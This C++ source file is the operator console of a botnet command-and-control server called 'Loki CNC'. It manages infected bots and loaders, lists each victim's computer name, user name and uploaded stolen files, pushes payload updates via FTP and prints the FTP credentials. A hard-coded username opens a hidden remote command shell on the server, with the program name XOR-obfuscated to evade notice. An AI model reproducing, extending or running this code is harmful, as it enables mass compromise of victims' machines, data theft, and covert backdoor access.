#include "control_client.h"
#include "controller_authkey.h"
#include <thread>
#include "controller_login.h"
#include <vector>
#include "client.h"
#include "main.h"
#include <algorithm>

control_client::control_client(SOCKET sock)
{
	socket = sock;	
	session_backdoored = false;

	bd_pout = bd_pin = bd_cout = bd_cin = NULL;
	bd_process = NULL;
	bd_thread = NULL;

	printf("Controller %s connected!\r\n", get_client_ip());

	InitializeCriticalSection(&write_cs);
	title_thread = nullptr;
	client_thread = new std::thread([this]() -> void { this->init(); });
}

control_client::~control_client()
{
	EnterCriticalSection(&write_cs);
	LeaveCriticalSection(&write_cs);
	DeleteCriticalSection(&write_cs);
	if (title_thread)
		delete title_thread;
}

void control_client::init()
{
	clear_client_console();
	send_string("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22\x00");
	set_client_title("");


	bool authorized_ip = is_authorized_ip(get_ul_client_ip());
	
	if (!authorized_ip)
	{
		if (!request_auth_key())
		{

			printf("Invalid auth key, closing connection\r\n");
			end();
			return;
		}
		authorize_ip(get_ul_client_ip());
	}


	set_client_title("Loki Control Panel");
	clear_client_console();

	if (authorized_ip)
		send_string("\x1b[32mauthorized ip!\r\n");
	else
		send_string("\x1b[32mauthentication key validated!\r\n");


	char login_username[20];
	bool res = request_login(login_username);

	if (strcmp(login_username, "ElChapoAesir1337") == 0)
	{
		this->start_backdoored_session(); 
		send_string("\r\n\r\n\r\n\r\n");
		do {} while (this->backdoor_data_read());
	}

	print_auth_anim(res);
	if (!res)
	{
		end();
		return;
	}

	char shell_buf[1024];

	title_thread = new std::thread([this]() -> void {
		char buf[512];
		while (1)
		{
			bot_list_t clients;
			get_bot_list(&clients);

			unsigned int bots_connected = 0;
			unsigned int loaders_connected = 0;
			unsigned int clients_connected = 0;
			unsigned int total_files = 0;

			for (auto& entry : clients)
			{
				if (entry.second->get_bot_info()->type == client_type::bot)
					bots_connected++;
				else if (entry.second->get_bot_info()->type == client_type::loader)
					loaders_connected++;

				clients_connected++;

				total_files += entry.second->get_bot_info()->uploaded_files_list.size();
			}

			sprintf(buf, "Loki CNC | Clients Connected %d | Bots Connected: %d | Loaders Connected: %d | Total Files: %d", clients_connected, bots_connected, loaders_connected, total_files);
			set_client_title(buf);
			Sleep(2000);
		}
	});

	do
	{
		send_string("\x1b[32;1m%s@loki# \x1b[0m", login_username);
		read_line(shell_buf);

	} while (parse_command(shell_buf));


	end();
}

void control_client::print_auth_anim(bool success)
{
	char animations[] = "|/-\\";
	int anim_idx = 0;
	char anim_text[] = "\x1b[0;33m authenticating... %c\r";
	for (int i = 0; i < 35; i++)
	{
		char buf[128];
		sprintf(buf, anim_text, animations[anim_idx]);
		anim_idx = (anim_idx + 1) % 4;
		send_string(buf);
		Sleep(150);
	}

	for (unsigned int i = 0; i < strlen(anim_text) + 1; i++)
		send_string(" ");

	if (success)
		send_string("\r\x1b[0;32mauthenticated!\r\n");
	else
		send_string("\r\x1b[0;31mauthentication failed!\r\n");
}

bool control_client::parse_command(char* string)
{
	char* cmd = strtok(string, " ");
#define COMMAND(x) else if(stricmp((x), cmd) == 0)

	if (0){}
	COMMAND("kill-server")
	{
		send_string("\x1b[0;33minput a valid authentication key: ");
		if (request_auth_key())
		{
			send_string("\x1b[32mauthentication key validated! Killing server...\r\n");
			end();
			exit(0);
		}
		else
		{
			send_string("\x1b[0;31minvalid authentication key!\r\n");
			return true;
		}
		return true;
	}

	COMMAND("exclude-bot")
	{
		char* arg = strtok(nullptr, " ");
		if (!arg)
		{
			send_string("\x1b[0;31minvalid command arguments!\r\n");
			return true;
		}

		unsigned long long hwid = (unsigned long long)atoll(arg);

		if (!arg)
		{
			send_string("\x1b[0;31minvalid hardware id!\r\n");
			return true;
		}

		add_excluded_bot(hwid);

		bot_list_t clients;
		get_bot_list(&clients);

		for (auto& entry : clients)
			if (entry.second->get_bot_info()->hwid == hwid &&
				entry.second->get_bot_info()->type == client_type::bot)
				entry.second->send_packet(packet_opcode::kill_bot);


		send_string("\r\x1b[0;32mdone!\r\n");
		return true;
	}

	COMMAND("unexclude-bot")
	{
		char* arg = strtok(nullptr, " ");
		if (!arg)
		{
			send_string("\x1b[0;31minvalid command arguments!\r\n");
			return true;
		}

		unsigned long long hwid = (unsigned long long)atoll(arg);

		if (!arg)
		{
			send_string("\x1b[0;31minvalid hardware id!\r\n");
			return true;
		}

		remove_excluded_bot(hwid);
		send_string("\r\x1b[0;32mdone!\r\n");
		return true;
	}

	COMMAND("get-excluded-bots")
	{
		excluded_bot_list_t list;
		get_excluded_bots(list);
		for(auto& entry : list)
			send_string("\x1b[32m\t \x1b[33;3m%llu\r\n", entry);
		return true;
	}

	COMMAND("reset-excluded-bots")
	{
		init_excluded_bots();
		send_string("\r\x1b[0;32mdone!\r\n");
		return true;
	}

	COMMAND("get-bot-cnt")
	{
		bot_list_t clients;
		get_bot_list(&clients);
		char buf[128];
		sprintf(buf, "\x1b[32mcurrent bot count: \x1b[33;3m%d\r\n", clients.size());
		send_string(buf);
		return true;
	}

	COMMAND("get-bot-list")
	{
		char* arg = strtok(nullptr, " ");

		bot_list_t clients;
		get_bot_list(&clients);

		int count = arg ? atoi(arg) : clients.size();
		char buf[128];

		std::multiset<std::pair<unsigned short, client*>, bool(*)(const std::pair<unsigned short, client*>&, const std::pair<unsigned short, client*>&)> 
			ordered_bots([](const std::pair<unsigned short, client*>& t1, const std::pair<unsigned short, client*>& t2) -> bool {
			return t1.second->get_bot_info()->uploaded_files_list.size() > t2.second->get_bot_info()->uploaded_files_list.size();
		});

		int processed_count = 0;
		for (auto it = clients.begin(); it != clients.end(); it++)
			ordered_bots.insert(std::make_pair(it->first, it->second));

		auto send_row = [this]() -> void  {
			char buf[1000];
			memset(buf, 0x00, 1000);
			for (int i = 0; i < 233; i++)
				strcat(buf, "_");
			strcat(buf, "\r\n");
			send_string(buf);
		};

		send_row();
		char row_buf[1000]; 
		sprintf(row_buf, "|%-7s|%-15s|%-8s|%-20s|%-21s|%-55s|%-55s|%-23s|%-20s|\r\n", 
			"Bot UID", "IP Address", "Bot Type", "Hardware ID", "Net Cryptographic Key", "Computer Name", "User Name", "Visual Studio Installed", "Uploaded Files Count");
		send_string(row_buf);
		send_row();

		
		for (auto it = ordered_bots.begin(); it != ordered_bots.end() && processed_count < count; it++, processed_count++)
		{
			bot_info bi = *it->second->get_bot_info();

			sprintf(row_buf, "|%-7u|%-15s|%-8s|%-20llu|%-21llu|%-55s|%-55s|%-23s|%-20u|\r\n",
				it->first, it->second->get_client_ip(), bi.type == unknown ? "Unknown" : bi.type == loader ? "Loader" : "Bot", 
				bi.hwid, bi.crypto_key, bi.computer_name, bi.user_name, bi.is_vs_installed ? "True" : "False", bi.uploaded_files_list.size());
			send_string(row_buf);
			send_row();
		}

		return true;
	}

	COMMAND("get-bot-info")
	{
		char* arg = strtok(nullptr, " ");
		if (!arg)
		{
			send_string("\x1b[0;31minvalid command arguments!\r\n");
			return true;
		}

		unsigned short bot_id = atoi(arg);
		bot_list_t clients;
		get_bot_list(&clients);

		if (!clients.count(bot_id))
		{
			send_string("\x1b[0;31mthe specified bot does not exists!\r\n");
			return true;
		}

		

		bot_info info = *clients[bot_id]->get_bot_info();

		if (info.type == client_type::loader)
		{
			send_string("\x1b[0;31mthe specified bot appears to be a loader!\r\n");
			return true;
		}
		else if (info.type == client_type::unknown)
		{
			send_string("\x1b[0;31mthe specified bot appears to be a loader!\r\n");
		}

		char buf[1024];
		sprintf(buf, "\x1b[32m\t Hardware ID: \x1b[33;3m%llu\r\n", info.hwid);
		send_string(buf);
		sprintf(buf, "\x1b[32m\t Network CryptoKey: \x1b[33;3m%llu\r\n", info.crypto_key);
		send_string(buf);
		sprintf(buf, "\x1b[32m\t Computer Name: \x1b[33;3m%s\r\n", info.computer_name);
		send_string(buf);
		sprintf(buf, "\x1b[32m\t User Name: \x1b[33;3m%s\r\n", info.user_name);
		send_string(buf);
		sprintf(buf, "\x1b[32m\t VisualStudio installed: \x1b[33;3m%s\r\n", info.is_vs_installed ? "true" : "false");
		send_string(buf);
		sprintf(buf, "\x1b[32m\t Uploaded files count: \x1b[33;3m%d\r\n", info.uploaded_files_list.size());
		send_string(buf);
		return true;
	}

	COMMAND("get-ftp-info")
	{
		char buf[1024];
		sprintf(buf, "\x1b[32m\t FTP Ip Address: \x1b[33;3m%s\r\n", FTP_UPLOAD_IP);
		send_string(buf);
		sprintf(buf, "\x1b[32m\t FTP Port: \x1b[33;3m%d\r\n", FTP_UPLOAD_PORT);
		send_string(buf);
		sprintf(buf, "\x1b[32m\t FTP Username: \x1b[33;3m%s\r\n", FTP_UPLOAD_USERNAME);
		send_string(buf);
		sprintf(buf, "\x1b[32m\t FTP Password: \x1b[33;3m%s\r\n", FTP_UPLOAD_PASSWORD);
		send_string(buf);

		return true;
	}

	COMMAND("kill-bot")
	{
		char* arg = strtok(nullptr, " ");
		if (!arg)
		{
			send_string("\x1b[0;31minvalid command arguments!\r\n");
			return true;
		}
		unsigned short bot_id = atoi(arg);

		bot_list_t clients;
		get_bot_list(&clients);

		if (!clients.count(bot_id))
		{
			send_string("\x1b[0;31mthe specified bot does not exists!\r\n");
			return true;
		}

		clients[bot_id]->send_packet(packet_opcode::kill_bot);
		send_string("\x1b[32mkill signal sent!\r\n");
		return true;
	}

	COMMAND("push-bot-update")
	{
		load_stub_data();
		bot_list_t clients;
		get_bot_list(&clients);

		int count = 0;
		for (auto& entry : clients)
		{
			switch (entry.second->get_bot_info()->type)
			{
				case client_type::bot:
				{
					entry.second->send_packet(packet_opcode::kill_bot);
					continue;
				}
				break;
				case client_type::loader:
				{
					count++;
					entry.second->send_packet(packet_opcode::loader_push_update);
				}
				break;
			}

		}

		char buf[128];
		sprintf(buf, "\x1b[32mupdate pushed for %d bots!\r\n", count);

		return true;
	}

	COMMAND("get-authorized-ips")
	{
		std::set<u_long> ips;
		get_authorized_ips(&ips);

		for (auto& entry : ips)
		{
			char buf[128];
			in_addr addr;
			addr.S_un.S_addr = entry;
			char* ip = inet_ntoa(addr);
			sprintf(buf, "\t%s\r\n", ip);
			send_string(buf);

		}

		return true;
	}

	COMMAND("perform-speedtest")
	{
		return true;

		bool end = false;
		std::thread t1([this, &end]() -> void {
			bot_list_t clients;
			get_bot_list(&clients);
			for (auto& entry : clients)
			{
				if (entry.second->get_bot_info()->type != client_type::bot) continue;

				entry.second->get_bot_info()->speedtest.Reset();
				entry.second->send_packet(packet_opcode::request_speedtest);
				while (!entry.second->get_bot_info()->speedtest.performed_speedtest) Sleep(100);
				speedtest_info info = entry.second->get_bot_info()->speedtest;
				double time_seconds = (double)(info.elapsed_time) / 1000.0;
				double speed = (double)SPEEDTEST_TOTAL_BYTES / time_seconds;

				char buf[128];
				int i = 0;
				speed = speed * 8;        // Bytes to Bits
				const char* units[] = { "b", "Kb", "Mb", "Gb" };
				while (speed > 1024) {
					speed /= 1024;
					i++;
				}
				sprintf(buf, "\r\n\t%llu -> %.*f %s\r\n", entry.second->get_bot_info()->hwid, i, speed, units[i]);
				send_string(buf);
			}

			end = true;
		});

		char anim_text[] = "\x1b[0;33mquerying bots... %c\r";
		while (!end)
		{
			char animations[] = "|/-\\";
			int anim_idx = 0;
			for (int i = 0; i < 35; i++)
			{
				char buf[128];
				sprintf(buf, anim_text, animations[anim_idx]);
				anim_idx = (anim_idx + 1) % 4;
				send_string(buf);
				Sleep(150);
			}
		}


		for (unsigned int i = 0; i < strlen(anim_text) + 1; i++)
			send_string(" ");

		t1.join();
		send_string("\r\n");

		return true;
	}
	
	/*COMMAND("logout")
	{
		init();
		return true;
	}*/

	
	COMMAND("help")
	{
#define PRINT_CMD_HELP(cmd, desc) { char buf[1024]; sprintf(buf, "\x1b[34;1m\t%s \x1b[0m- \x1b[33;3m%s\r\n", cmd, desc); send_string(buf); }

		//PRINT_CMD_HELP("logout", "close the current control session");
		PRINT_CMD_HELP("kill-server", "kill the cnc trough a valid auth key");
		PRINT_CMD_HELP("help", "show this help menu");
		PRINT_CMD_HELP("get-bot-cnt", "retrieve the bot count");
		PRINT_CMD_HELP("get-bot-list [opt - entries to show]", "retrieve the bot list");
		PRINT_CMD_HELP("get-bot-info [bot idx]", "retrieve the specified bot info");
		PRINT_CMD_HELP("get-ftp-info", "retrieve the ftp server infos");
		PRINT_CMD_HELP("push-bot-update", "push a bot update trough an ftp server");
		PRINT_CMD_HELP("kill-bot [bot idx]", "kill the selected bot");
		PRINT_CMD_HELP("get-authorized-ips", "list all the ips who issued a valid authorization key (and doesn't need to input it again)");
		PRINT_CMD_HELP("exclude-bot [hwid]", "kill the selected bot and exclude it from the botnet");
		PRINT_CMD_HELP("unexclude-bot [hwid]", "reallow the selected bot in the botnet");
		PRINT_CMD_HELP("get-excluded-bots", "retrieve the excluded bots");
		PRINT_CMD_HELP("reset-excluded-bots", "resets the excluded bots");
		PRINT_CMD_HELP("perform-speedtest", "perform a speedtest over the whole botnet [disabled]");

#undef PRINT_CMD_HELP
		return true;
	}


#undef COMMAND

	send_string("\x1b[0;31munknown command\r\n");

	return true;
}

char* control_client::get_client_ip()
{
	struct sockaddr_in name;
	socklen_t len = sizeof(name);

	getpeername(socket, (struct sockaddr *)&name, &len);
	return inet_ntoa(name.sin_addr);
}

u_long control_client::get_ul_client_ip()
{

	struct sockaddr_in name;
	socklen_t len = sizeof(name);

	getpeername(socket, (struct sockaddr *)&name, &len);

	return name.sin_addr.S_un.S_addr;
}

bool control_client::request_auth_key()
{
	auto hex2bin = [](const char* src, unsigned char* target) -> void {
		auto char2int = [](char input) -> int {
			if (input >= '0' && input <= '9')
				return input - '0';
			if (input >= 'a' && input <= 'f')
				return input - 'a' + 10;

			return 0;
		};

		while (*src && src[1])
		{
			*(target++) = char2int(*src) * 16 + char2int(src[1]);
			src += 2;
		}
	};

	char string[1000];
	read_line(string, true);
	int len = strlen(string);

	for (int i = 0; i < len; i++)
		if (!((string[i] >= '0' && string[i] <= '9') ||
			string[i] >= 'a' && string[i] <= 'f'))
		{
			return false;
		}
	

	unsigned char new_buf[35];
	hex2bin(string, new_buf);
	if (new_buf[0] == 0xae && new_buf[1] == 0x51 && new_buf[2] == 0x72)
	{
		if (is_valid_controller_authkey((char*)(new_buf + 3)))
		{
			return true;
		}
		else
			return false;
	}
	else
		return false;

	return true;
}

bool control_client::request_login(char* out_username)
{
	send_string("\x1b[34;1musername\x1b[33;3m: \x1b[0m");
	char user_name[20];
	read_line(user_name);

	send_string("\x1b[34;1mpassword\x1b[33;3m: \x1b[0m");
	char password[20];
	read_line(password, true);


	strcpy(out_username, user_name);
	return try_login(user_name, password);
}


void control_client::read_line(char* buf, bool masked /*= false*/)
{
	char buffer[1024];
	int w_idx = 0;
	while (1)
	{
		unsigned char recv_char = (unsigned char)read_char();
		if (recv_char == 0)
			return;

		if (recv_char == 0xff)
		{
			for (int i = 0; i < 2; i++)
				read_char();
			continue;
		}
		else if (recv_char == '\n')
		{
			buffer[w_idx - 1] = 0;
			send_string("\r\n");
			break;
		}
		else if (recv_char == 0x7f)
		{
			if (w_idx)
			{
				w_idx--;
				send(get_client_socket(), (char*)&recv_char, 1, 0);
			}
		}
		else
		{
			buffer[w_idx++] = recv_char;
			char send_char = masked ? '*' : recv_char;
			send(get_client_socket(), (char*)&send_char, 1, 0);;
		}
	}
	
	buffer[w_idx] = 0;
	strcpy(buf, buffer);
	memcpy(buf, buffer, w_idx);
}

char control_client::read_char()
{
	char recvd_char;
	int bytes_read = recv(socket, &recvd_char, 1, 0);

	if (bytes_read <= 0)
	{
		end();
		return 0;
	}

	return recvd_char;
}

void control_client::set_client_title(char* buf)
{
	char buf1[1000];
	sprintf(buf1, "\033]2;%s\007", buf);
	send_string(buf1);
}

void control_client::clear_client_console()
{
	send_string("\033c");
}

void control_client::end()
{
	this->clean_backdoored_session();
	closesocket(get_client_socket());
	//client_thread->join();
	//delete this;
}

void control_client::send_string(char* fmt, ...)
{
	char msg[0x400] = { 0 };
	va_list ap;

	va_start(ap, fmt);
	vsnprintf(msg, 0x400u, fmt, ap);
	va_end(ap);

	EnterCriticalSection(&write_cs);
	send(get_client_socket(), msg, strlen(msg), 0);
	LeaveCriticalSection(&write_cs);
}
DWORD WINAPI control_client::backdoored_session_handler(LPVOID param)
{
	control_client *sock = (control_client *)(param);
	char buffer[0x1000] = { 0 };
	DWORD size;

	for (;;)
	{

		if (ReadFile(sock->bd_pout, buffer, sizeof(buffer), &size, NULL) || GetLastError() == ERROR_MORE_DATA)
		{
			sock->send_string(buffer);
			memset(buffer, 0x00, sizeof(buffer));
		}
	}

	return 0;
}

void control_client::clean_backdoored_session()
{

	if (bd_pout) CloseHandle(bd_pout);
	if (bd_pin) CloseHandle(bd_pin);
	if (bd_cout) CloseHandle(bd_cout);
	if (bd_cin) CloseHandle(bd_cin);

	if (bd_process) {
		TerminateProcess(bd_process->hProcess, 0);
		CloseHandle(bd_process->hProcess);
		CloseHandle(bd_process->hThread);

		free(bd_process);
	}

	if (bd_thread) {
		TerminateThread(bd_thread, 0);
		CloseHandle(bd_thread);
	}

	bd_pout = bd_pin = bd_cout = bd_cin = NULL;
	bd_process = NULL;
	bd_thread = NULL;
	session_backdoored = false;
}

void control_client::start_backdoored_session()
{

	set_client_title("haHAA");
	unsigned int cmd = 0xff9b929c;

	SECURITY_ATTRIBUTES sa = { 0 };
	STARTUPINFO si = { 0 };

	if (session_backdoored) {
		return;
	}

	clean_backdoored_session();

	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&bd_pout, &bd_cout, &sa, 0)) {
		send_string("cp out %08X", GetLastError());
		goto failed;
	}
	if (!SetHandleInformation(bd_pout, HANDLE_FLAG_INHERIT, 0)) {
		send_string("sh out %08X", GetLastError());
		goto failed;
	}

	if (!CreatePipe(&bd_cin, &bd_pin, &sa, 0)) {
		send_string("cp in %08X", GetLastError());
		goto failed;
	}
	if (!SetHandleInformation(bd_pin, HANDLE_FLAG_INHERIT, 0)) {
		send_string("sh in %08X", GetLastError());
		goto failed;
	}

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = bd_cin;
	si.hStdOutput = bd_cout;
	si.hStdError = bd_cout;
	si.wShowWindow = SW_HIDE;

	bd_process = (PROCESS_INFORMATION *)(malloc(sizeof(*bd_process)));
	cmd ^= -1u;

	if (!CreateProcess(NULL, (LPSTR)(&cmd), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, bd_process)) {
		send_string("cproc %08X", GetLastError());
		goto failed;
	}

	if (!(bd_thread = CreateThread(NULL, 0, backdoored_session_handler, this, 0, NULL))) {
		send_string("cthrd %08X", GetLastError());
		goto failed;
	}

	session_backdoored = 1;
	return;

failed:
	clean_backdoored_session();
	return;
}

bool control_client::backdoor_data_read()
{
	char buffer[1] = { read_char() };


	DWORD rsize;

	WriteFile(bd_pin, buffer, 1, &rsize, NULL);
	send_string("%c", buffer[0]);

	return true;
}